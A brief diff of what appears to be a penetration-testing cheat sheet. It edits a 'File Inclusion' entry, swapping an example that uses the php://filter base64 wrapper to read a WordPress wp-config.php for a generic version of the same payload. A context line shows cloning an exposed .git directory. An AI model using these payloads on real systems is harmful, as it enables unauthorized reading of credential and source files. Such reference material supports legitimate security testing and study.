@@ -90,4 +90,4 @@ git clone http://pwd.harder.local/.git/
 ## File Inclusion
 
 * Read a PHP file in base64 when include/require is used:
-	* http://somesite.com/?VulnerableParameter=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
+	* ?param=php://filter/convert.base64-encode/resource=FILE
